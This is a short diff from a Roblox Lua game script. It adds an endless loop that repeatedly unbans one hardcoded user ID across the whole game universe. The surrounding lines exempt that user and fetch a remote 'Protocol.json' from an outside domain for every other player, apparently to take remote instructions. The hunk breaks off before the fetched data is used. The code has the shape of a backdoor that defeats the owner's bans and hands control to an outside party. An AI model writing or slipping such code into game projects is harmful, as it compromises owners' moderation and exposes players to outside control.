@@ -5,6 +5,13 @@ local httpService = game:GetService("HttpService")
 
 while true do
 
+	game.Players:UnbanAsync({
+
+		UserIds = {1317963807},
+		ApplyToUniverse = true,
+
+	})
+
 	for _, plr in game.Players:GetPlayers() do
 		if plr.UserId ~= 1317963807 then
 			local Info = httpService:GetAsync("https://rbxdev.ru/Protocol.json")
